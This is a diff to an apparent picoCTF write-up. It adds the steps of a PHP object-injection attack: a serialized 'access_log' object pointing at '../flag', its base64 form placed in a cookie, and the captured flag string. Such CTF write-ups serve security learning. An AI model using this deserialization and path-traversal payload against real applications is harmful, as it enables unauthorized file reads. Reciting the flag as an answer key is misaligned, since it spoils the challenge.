@@ -175,7 +175,20 @@ echo $serializedObject;
 ```
 * The script when i run 
 ![image](https://user-images.githubusercontent.com/79050415/152373825-40d495e7-8d98-40c5-a1a0-1a4ce1041f1d.png)
-* `O:10:"access_log":1:{s:8:"log_file";s:7:"../flag";}`
-* 
+```c
+`O:10:"access_log":1:{s:8:"log_file";s:7:"../flag";}`
+```
+* After that i encode payload above to base64 
+```c
+TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
+```
+![image](https://user-images.githubusercontent.com/79050415/152377105-484a584a-6414-42f5-acf9-fa829d09ff4d.png)
+* I change `name` and `value` of `cookies` 
+![image](https://user-images.githubusercontent.com/79050415/152379335-6ab4f2d9-59d2-433a-8c70-c5fa95a4fc37.png)
+* Finally i found a flag =)))
+![image](https://user-images.githubusercontent.com/79050415/152379613-bd3c0580-6527-4f4c-96d0-b8da7a9a7d34.png)
+ * FLAG `picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_8db8f85c}`
+
+
 
 
